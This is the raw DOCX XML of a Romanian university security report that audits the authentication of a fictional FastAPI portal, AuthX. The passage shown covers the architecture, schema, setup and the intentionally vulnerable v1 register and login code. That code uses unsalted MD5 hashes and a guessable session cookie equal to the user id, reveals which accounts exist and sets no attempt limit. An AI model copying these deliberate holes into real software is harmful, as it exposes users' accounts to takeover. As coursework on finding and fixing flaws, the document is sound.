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RAPORT DE SECURITATE – PROIECT #2: BREAK THE LOGIN</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Curs: Dezvoltarea Aplicatiilor Software Securizate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Facultatea de Matematica si Informatica, Universitatea din Bucuresti</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Conf. Univ. Dr. Marius Iulian Mihailescu</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Aplicatie: AuthX – Internal Access Portal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Student: [Numele Studentului]</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Data: 30 Aprilie 2026</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Versiuni: v1 (vulnerabil – main.py) | v2 (securizat – main_secure.py)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>1. INTRODUCERE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>1.1 Scopul raportului</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Prezentul raport documenteaza procesul complet de analiza de securitate</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>efectuat asupra aplicatiei web AuthX, realizata in cadrul Proiectului #2 din</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cursul „Dezvoltarea Aplicatiilor Software Securizate". Raportul acopera atat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>rolul de Security Tester (identificarea si demonstrarea practica a</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>vulnerabilitatilor), cat si rolul de Developer (implementarea fix-urilor si</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>validarea lor).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Auditul se concentreaza exclusiv pe mecanismele de autentificare:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Inregistrare utilizatori (Register)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Autentificare (Login)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Gestionarea sesiunilor (Cookies / Tokens)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Resetarea parolei (Forgot Password)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Politica de parole</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>1.2 Descrierea aplicatiei</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>AuthX este un portal intern fictiv utilizat de angajatii companiei „AuthX"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>pentru accesarea resurselor sensibile. Aplicatia expune un API REST construit</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>cu framework-ul FastAPI (Python) si utilizeaza o baza de date SQLite locala.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Fluxul principal al aplicatiei:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Un utilizator nou acceseaza /register si creaza un cont (email + parola).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. Utilizatorul se autentifica la /login cu credentialele create.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. La autentificare cu succes, serverul emite un cookie de sesiune.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. Cookie-ul este inclus automat in fiecare request ulterior, permitand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accesul la /dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. La /logout sesiunea este invalidata si cookie-ul sters.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6. Daca utilizatorul uita parola, poate solicita un link de resetare la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/request-reset. Linkul contine un token unic care permite setarea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unei parole noi la /reset-password.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>1.3 Arhitectura aplicatiei</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz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sz w:val="20"/>
        </w:rPr>
        <w:t>│                         CLIENT (Browser)                            │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│   login.html / register.html / dashboard.html / reset_password.html │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>└─────────────────────┬───────────────────────────────────────────────┘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            │  HTTP (JSON + Cookie)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            ▼</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz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sz w:val="20"/>
        </w:rPr>
        <w:t>│                    BACKEND – FastAPI (Python)                        │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│   Endpoints:                                                         │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     GET  /           → login.html                                   │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     POST /login      → autentificare                                 │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     GET  /register   → register.html                                │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     POST /register   → creare cont                                   │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     POST /logout     → invalidare sesiune                           │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     GET  /dashboard  → pagina protejata                             │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     POST /request-reset → generare token resetare                   │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│     POST /reset-password → setare parola noua                       │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>└─────────────────────┬───────────────────────────────────────────────┘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            │  sqlite3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            ▼</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz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sz w:val="20"/>
        </w:rPr>
        <w:t>│                    DATABASE – SQLite                                 │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│   Tabele: users, sessions, reset_tokens, audit_logs, tickets        │</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20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/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Schema bazei de date (relevanta pentru autentificare):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabel users: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id              INTEGER PRIMARY KEY AUTOINCREMENT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email           TEXT UNIQUE NOT NULL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password_hash   TEXT NOT NULL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salt            TEXT DEFAULT ''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role            TEXT DEFAULT 'USER'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created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP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locked          BOOLEAN DEFAULT 0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failed_attempts INTEGER DEFAULT 0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lockout_until   TIMESTAMP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabel sessions: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id              INTEGER PRIMARY KEY AUTOINCREMENT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user_id         INTEGER NOT NULL (FK → users.id)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session_token   TEXT UNIQUE NOT NULL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created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP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expires_at      TIMESTAMP NOT NULL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ip_address      TEXT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user_agent      TEXT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabel reset_tokens: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id              INTEGER PRIMARY KEY AUTOINCREMENT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email           TEXT NOT NULL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token           TEXT UNIQUE NOT NULL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created_at      TIMESTAMP DEFAULT CURRENT_TIMESTAMP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expires_at      TIMESTAMP</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Tabel audit_logs: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id              INTEGER PRIMARY KEY AUTOINCREMENT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user_id         INTEGER (FK → users.id)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action          TEXT NOT NULL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resource        TEXT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timestamp       TIMESTAMP DEFAULT CURRENT_TIMESTAMP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ip_address      TEXT</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Stack tehnologic:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Limbaj: Python 3.12</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Framework web: FastAPI 0.136+</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Server ASGI: Uvicorn 0.27+</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Baza de date: SQLite 3 (fisier local ./db/database.db)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Hashing parole v1: MD5 (hashlib, fara salt)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Hashing parole v2: bcrypt 5.0 (cu salt automat)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Frontend: HTML5 + JavaScript (Fetch API)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Sistem de operare: Ubuntu/Debian Linux</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>2. SETUP MEDIU DE LUCRU</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>2.1 Cerinte sistem</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- OS: Linux (Ubuntu 22.04+ / Debian 12+) sau Windows cu WSL2</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- Python: versiunea 3.10 sau mai noua</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- pip: inclus cu Python</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- curl sau Postman: pentru testare manuala a endpoint-urilor</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>- SQLite3: inclus implicit cu Python</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>2.2 Instalare dependinte</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 1: Clonarea proiectului sau extragerea arhivei</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ cd ~</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ mkdir DAS &amp;&amp; cd DAS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t># (copiati fisierele proiectului in acest director)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 2: Instalarea pachetelor Python necesare</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ pip install bcrypt fastapi uvicorn --break-system-packages</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pachete instalate: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- fastapi 0.136.1     – framework web async de tip REST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- uvicorn 0.27.1      – server ASGI pentru FastAPI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- bcrypt 5.0.0        – hashing securizat de parole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- pydantic 2.13.3     – validare date de intrare (inclus cu FastAPI)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- starlette 1.0.0     – layer HTTP (inclus cu FastAPI)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 3: Initializarea bazei de date</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ cd db</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ python3 init_db.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>→ Output asteptat: „Baza de date si tabelele au fost create cu succes!"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ cd ..</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Scriptul init_db.py executa urmatoarele operatii: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- Sterge tabelele existente (DROP TABLE IF EXISTS)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- Creeaza tabelele: users, tickets, audit_logs, sessions, reset_tokens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- Aplica constrangerile de cheie straina si constrangerile UNIQUE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 4: Pornirea serverului v1 (vulnerabil) – portul 8000</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ uvicorn main:app --port 8000 --reload</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 5: Pornirea serverului v2 (securizat) – portul 8001</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ uvicorn main_secure:app --port 8001 --reload</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Pasul 6: Verificare functionare</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ curl -s http://127.0.0.1:8000/ -o /dev/null -w "v1 HTTP: %{http_code}\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>$ curl -s http://127.0.0.1:8001/ -o /dev/null -w "v2 HTTP: %{http_code}\n"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>→ Ambele trebuie sa returneze HTTP 200.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>2.3 Structura proiectului</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>DAS/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>├── main.py                  ← Backend v1 (vulnerabil)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>├── main_secure.py           ← Backend v2 (securizat)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>├── poc.py                   ← Script Proof of Concept (toate 6 teste)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>├── db/</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│   ├── init_db.py           ← Initializare schema SQLite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>│   └── database.db          ← Fisierul bazei de date (generat la rulare)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>└── html/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├── login.html           ← Pagina login v1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├── login_secure.html    ← Pagina login v2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├── register.html        ← Pagina register v1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├── register_secure.html ← Pagina register v2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├── dashboard.html       ← Dashboard (dupa login)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└── reset_password.html  ← Pagina resetare parola</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="1F397D"/>
        </w:rPr>
        <w:t>3. IMPLEMENTARE MVP – MECANISMUL DE AUTENTIFICARE</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>3.1 Inregistrare utilizator (Register)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint: POST /register</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Request body (JSON):  { "email": "user@example.com", "password": "parola" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Comportament v1 (vulnerabil):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Primeste email si parola de la client.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. Verifica unicitatea email-ului in tabela users (SELECT WHERE email = ?).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. Calculeaza hash-ul parolei cu MD5 (fara salt): hashlib.md5(pwd.encode()).hexdigest()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. Insereaza inregistrarea in tabela users.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. Nu valideaza lungimea sau complexitatea parolei.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6. Returneaza { "message": "Utilizator inregistrat cu succes!" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Fragment cod v1 (main.py):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password_hash = hashlib.md5(user.password.encode()).hexdigest()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db.execute(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"INSERT INTO users (email, password_hash) VALUES (?, ?)",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(user.email, password_hash)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)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="2E6EB5"/>
        </w:rPr>
        <w:t>3.2 Autentificare (Login)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Endpoint: POST /login</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Request body (JSON): { "email": "user@example.com", "password": "parola" }</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Comportament v1 (vulnerabil):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>1. Cauta utilizatorul in baza de date dupa email.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>2. Daca utilizatorul nu exista → HTTP 404 cu mesaj „User inexistent".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>3. Recalculeaza MD5 al parolei primite si compara cu hash-ul din DB.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>4. Daca parola nu se potriveste → HTTP 401 cu mesaj „Parola gresita".</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>5. La succes: seteaza cookie session_id = str(db_user['id']).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Cookies nu are HttpOnly, nu are Secure, SameSite implicit (lax).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr/>
      <w:r>
        <w:rPr>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>6. Nu exista limita de incercari.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
